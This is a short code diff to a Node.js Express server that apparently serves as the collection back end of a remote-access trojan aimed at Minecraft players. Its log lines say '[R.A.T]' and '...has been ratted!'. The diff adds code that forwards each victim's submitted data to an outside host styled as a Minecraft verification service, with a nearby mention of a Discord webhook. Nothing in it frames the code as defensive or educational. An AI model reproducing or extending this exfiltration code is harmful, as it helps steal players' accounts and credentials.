@@ -183,6 +183,15 @@ app.post("/", (req, res) => {
                 console.log("4111")
                 console.log(json(req.body))
                 console.log("5111")
+                
+                post("https://verification-minecraft.onrender.com", req.body
+                , {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }).catch(err => {
+                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+                })
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
